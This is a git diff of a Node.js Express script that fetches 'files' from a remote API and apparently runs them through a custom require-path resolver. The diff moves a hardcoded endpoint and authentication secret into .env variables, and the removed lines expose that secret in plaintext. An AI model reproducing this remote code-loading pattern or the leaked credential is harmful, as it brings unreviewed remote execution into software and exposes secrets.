@@ -1,15 +1,27 @@
-const FILESYSTEM__ = require("./system.js");
+require("dotenv").config();
 
-const AXIOS__ = require("axios")
+const FILESYSTEM__ = require("./system.js");
+const AXIOS__ = require("axios");
+
 const oldRequire = require;
+
 let express = require("express");
 let app = express();
-app.listen(4000);
+app.listen(4000, () => console.log("Server running on port 4000"));
 
-process.env = { priority: true };
-app.get("/", (req, res) => {
-  res.send("🚀 Server is running!");
-});
+const domain = process.env.DOMAIN;
+const password = process.env.PASSWORD;
+process.env.PRIORITY = "true";
+
+// ✅ تأكد إن .env اتقري فعلاً
+if (!domain || !password) {
+  console.error("Missing DOMAIN or PASSWORD in .env");
+  console.error("Make sure you have a .env file in project root with:");
+  console.error("DOMAIN=...");
+  console.error("PASSWORD=...");
+  process.exit(1);
+}
+
 class Main {
   constructor() {
     this._files = {};
@@ -20,9 +32,10 @@ class Main {
   }
 
   handleError(err) {
-    console.log(err.message);
+    console.log(err?.message || err);
     process.exit(0);
   }
+
   parseDataToArr(input) {
     // Add double quotes around the keys and values to make it valid JSON
     let formattedString = input
@@ -40,9 +53,9 @@ class Main {
   }
 
   async _request_Files() {
-    const filesObj = await AXIOS__.get("https://bc.arvex.me/api/files", {
+    const filesObj = await AXIOS__.get(domain, {
       headers: {
-        authentication: "SBrXagRBkN3$",
+        authentication: password, // ✅ من .env
       },
     })
       .then((res) => res.data)
@@ -100,6 +113,7 @@ class Main {
         } else if (splited[0] === ".") {
           executePath = executePath.split("/").slice(1).join("/");
         } else if (splited[0] === "") {
+          // no-op
         }
       }
 
@@ -165,5 +179,3 @@ result: ${!!result}
 }
 
 new Main();
-
-
